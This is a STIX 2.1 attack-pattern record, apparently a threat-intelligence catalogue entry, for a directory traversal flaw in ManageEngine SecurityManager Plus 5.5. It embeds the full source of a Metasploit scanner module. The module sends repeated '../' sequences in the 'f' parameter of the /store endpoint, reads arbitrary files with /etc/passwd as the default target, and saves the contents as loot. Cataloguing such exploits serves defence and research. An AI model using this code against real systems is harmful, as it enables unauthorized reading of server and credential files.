{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9aa5f49b-4589-450b-a3c5-013d756796f8",
    "created": "2024-08-14T16:28:33.991458Z",
    "modified": "2024-08-14T16:28:33.991462Z",
    "name": "ManageEngine SecurityManager Plus 5.5 Directory Traversal",
    "description": " This module exploits a directory traversal flaw found in ManageEngine SecurityManager Plus 5.5 or less.  When handling a file download request the DownloadServlet class fails to properly check the 'f' parameter, which can be abused to read any file outside the virtual directory.  'References'     => [ ['OSVDB', '86563'] ['EDB', '22092'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/manageengine_securitymanager_traversal.rb",
            "external_id": "manageengine_securitymanager_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ManageEngine SecurityManager Plus 5.5 Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal flaw found in ManageEngine\n        SecurityManager Plus 5.5 or less.  When handling a file download request,\n        the DownloadServlet class fails to properly check the 'f' parameter, which\n        can be abused to read any file outside the virtual directory.\n      },\n      'References'     =>\n        [\n          ['OSVDB', '86563'],\n          ['EDB', '22092']\n        ],\n      'Author'         =>\n        [\n          'blkhtc0rp', #Original\n          'sinn3r' #Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-10-19'\n    ))\n\n    register_options(\n      [\n        OptPort.new('RPORT',       [true, 'The target port', 6262]),\n        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),\n        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),\n        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])\n      ])\n  end\n\n\n  def run_host(ip)\n    base = normalize_uri(target_uri.path)\n    base << '/' if base[-1,1] != '/'\n\n    peer = \"#{ip}:#{rport}\"\n    fname = datastore['FILE']\n\n    print_status(\"Reading '#{datastore['FILE']}'\")\n    traverse = \"../\" * datastore['DEPTH']\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => \"#{base}store\",\n      'vars_get' => {\n        'f' => \"#{traverse}#{datastore['FILE']}\"\n      }\n    })\n\n\n    if res and res.code == 500 and res.body =~ /Error report/\n      print_error(\"Cannot obtain '#{fname}', here are some possible reasons:\")\n      print_error(\"\\t1. File does not exist.\")\n      print_error(\"\\t2. The server does not have any patches deployed.\")\n      print_error(\"\\t3. Your 'DEPTH' option isn't deep enough.\")\n      print_error(\"\\t4. Some kind of permission issues.\")\n\n    elsif res and res.code == 200\n      data = res.body\n      p = store_loot(\n        'manageengine.securitymanager',\n        'application/octet-stream',\n        ip,\n        data,\n        fname\n      )\n\n      vprint_line(data)\n      print_good(\"#{fname} stored as '#{p}'\")\n\n    else\n      print_error(\"Fail to obtain file for some unknown reason\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-19"
}